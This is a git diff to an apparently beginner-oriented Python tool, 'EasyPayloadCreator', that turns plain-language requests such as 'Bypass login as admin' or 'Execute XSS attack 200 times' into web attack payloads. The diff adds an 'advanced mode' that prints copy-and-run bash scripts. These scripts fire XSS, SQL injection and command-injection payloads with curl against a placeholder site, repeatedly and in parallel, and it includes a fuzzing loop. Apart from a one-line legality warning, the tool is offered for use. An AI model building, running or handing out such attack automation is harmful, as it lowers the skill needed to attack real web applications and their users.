@@ -85,6 +85,42 @@ class EasyPayloadCreator:
             ]},
         }
     
+    def detect_advanced_query(self, user_input):
+        """Detect if user wants advanced automation (loops, bulk testing, etc.)"""
+        user_input_lower = user_input.lower()
+        
+        advanced = {
+            'is_advanced': False,
+            'repeat_count': 1,
+            'parallel': False,
+            'automated': False,
+            'fuzzing': False,
+        }
+        
+        # Check for repetition keywords
+        repeat_keywords = ['times', 'repeatedly', 'loop', 'multiple times', 'bulk', 'mass']
+        if any(keyword in user_input_lower for keyword in repeat_keywords):
+            advanced['is_advanced'] = True
+            advanced['automated'] = True
+            
+            # Extract number if present
+            import re
+            numbers = re.findall(r'\d+', user_input)
+            if numbers:
+                advanced['repeat_count'] = int(numbers[0])
+        
+        # Check for parallel execution
+        if any(word in user_input_lower for word in ['parallel', 'concurrent', 'simultaneously', 'at once']):
+            advanced['parallel'] = True
+            advanced['is_advanced'] = True
+        
+        # Check for fuzzing
+        if any(word in user_input_lower for word in ['fuzz', 'fuzzing', 'variations', 'all payloads']):
+            advanced['fuzzing'] = True
+            advanced['is_advanced'] = True
+        
+        return advanced
+    
     def understand_intent(self, user_input):
         """Understand what the user wants to do"""
         user_input_lower = user_input.lower()
@@ -155,6 +191,81 @@ class EasyPayloadCreator:
             'hex': lambda p: ''.join(f'\\x{ord(c):02x}' for c in p),
         }
         return encodings.get(encoding, lambda p: p)(payload)
+    
+    def generate_automation_script(self, attack_type, payloads, advanced_config):
+        """Generate automation scripts for advanced queries"""
+        scripts = []
+        
+        if advanced_config['automated'] and advanced_config['repeat_count'] > 1:
+            # Bash for loop
+            count = advanced_config['repeat_count']
+            payload = payloads[0] if payloads else 'test'
+            
+            if attack_type == 'xss':
+                scripts.append({
+                    'name': 'Bash For Loop',
+                    'script': f'''# Execute XSS payload {count} times
+for i in {{1..{count}}}; do
+    echo "Test $i of {count}"
+    curl 'https://your-test-site.com/search?q={payload}'
+    sleep 0.5  # Wait 0.5 seconds between requests
+done'''
+                })
+            
+            elif attack_type == 'sqli':
+                scripts.append({
+                    'name': 'Bash For Loop',
+                    'script': f'''# Test SQLi {count} times
+for i in {{1..{count}}}; do
+    echo "Test $i of {count}"
+    curl -X POST https://your-test-site.com/login \\
+         -d 'username={payload}&password=test'
+    sleep 0.5
+done'''
+                })
+            
+            elif attack_type == 'command':
+                scripts.append({
+                    'name': 'Bash For Loop',
+                    'script': f'''# Test command injection {count} times
+for i in {{1..{count}}}; do
+    echo "Test $i of {count}"
+    curl 'https://your-test-site.com/ping?host=127.0.0.1{payload}'
+    sleep 0.5
+done'''
+                })
+        
+        if advanced_config['parallel']:
+            # GNU Parallel example
+            payload = payloads[0] if payloads else 'test'
+            scripts.append({
+                'name': 'GNU Parallel (Fast)',
+                'script': f'''# Test payloads in parallel (10 at a time)
+seq 1 {advanced_config['repeat_count']} | parallel -j 10 \\
+    'curl "https://your-test-site.com/search?q={payload}&test={{}}"'
+    
+# Or with xargs (simpler)
+seq 1 {advanced_config['repeat_count']} | xargs -P 10 -I {{}} \\
+    curl "https://your-test-site.com/search?q={payload}&test={{}}"'''
+            })
+        
+        if advanced_config['fuzzing']:
+            # Fuzzing script with all payloads
+            scripts.append({
+                'name': 'Fuzzing Script (All Payloads)',
+                'script': f'''# Test all {len(payloads)} payload variations
+payloads=(
+{chr(10).join(f'    "{p}"' for p in payloads)}
+)
+
+for payload in "${{payloads[@]}}"; do
+    echo "Testing: $payload"
+    curl 'https://your-test-site.com/search?q='$payload
+    sleep 0.3
+done'''
+            })
+        
+        return scripts
 
 def interactive_mode():
     """Super easy interactive mode"""
@@ -167,6 +278,7 @@ def interactive_mode():
     print("I'll create the technical payload for you.\n")
     
     print("📚 Examples of what you can say:")
+    print("\n  Basic:")
     print("  - 'Show an alert saying Hello'")
     print("  - 'Display a popup with XSS'")
     print("  - 'Bypass login as admin'")
@@ -174,6 +286,12 @@ def interactive_mode():
     print("  - 'Execute command whoami'")
     print("  - 'Get data from users table'")
     print("  - 'Access internal localhost'")
+    print("\n  🚀 Advanced (NEW!):")
+    print("  - 'Execute XSS attack 200 times'")
+    print("  - 'Test SQLi 50 times in parallel'")
+    print("  - 'Fuzz all XSS payloads'")
+    print("  - 'Run command injection 100 times'")
+    print("  - 'Test login bypass repeatedly 30 times'")
     print()
     
     while True:
@@ -187,11 +305,25 @@ def interactive_mode():
         if not user_input:
             continue
         
+        # Detect advanced query
+        advanced = creator.detect_advanced_query(user_input)
+        
         # Create payload
         result = creator.create_payload(user_input)
         
         print(f"\n✅ I understood: You want to test {result['type'].upper()}")
         print(f"📝 Message/Value: {result['message']}")
+        
+        # Show advanced detection
+        if advanced['is_advanced']:
+            print(f"\n🚀 ADVANCED MODE DETECTED!")
+            if advanced['automated']:
+                print(f"   - Automated testing: {advanced['repeat_count']} times")
+            if advanced['parallel']:
+                print(f"   - Parallel execution: Enabled")
+            if advanced['fuzzing']:
+                print(f"   - Fuzzing mode: All payload variations")
+        
         print(f"\n🎯 Here are your payloads:\n")
         
         for i, payload in enumerate(result['payloads'], 1):
@@ -310,6 +442,33 @@ def interactive_mode():
         print("✅ Use encoding if payloads are being blocked")
         print("\n⚠️  NEVER test on websites you don't own - it's ILLEGAL!")
         print("=" * 70 + "\n")
+        
+        # Show automation scripts if advanced mode
+        if advanced['is_advanced']:
+            automation_scripts = creator.generate_automation_script(
+                result['type'], 
+                encoded_payloads if encoded_payloads else result['payloads'],
+                advanced
+            )
+            
+            if automation_scripts:
+                print("\n" + "=" * 70)
+                print("🤖 AUTOMATION SCRIPTS - Copy & Run")
+                print("=" * 70)
+                
+                for script_info in automation_scripts:
+                    print(f"\n📜 {script_info['name']}:")
+                    print("-" * 70)
+                    print(script_info['script'])
+                    print("-" * 70)
+                
+                print("\n💾 To use:")
+                print("   1. Copy the script above")
+                print("   2. Save to a file: automation.sh")
+                print("   3. Make executable: chmod +x automation.sh")
+                print("   4. Run: ./automation.sh")
+                print("   5. Or paste directly in terminal")
+                print("=" * 70 + "\n")
 
 def quick_mode():
     """Quick one-liner mode"""
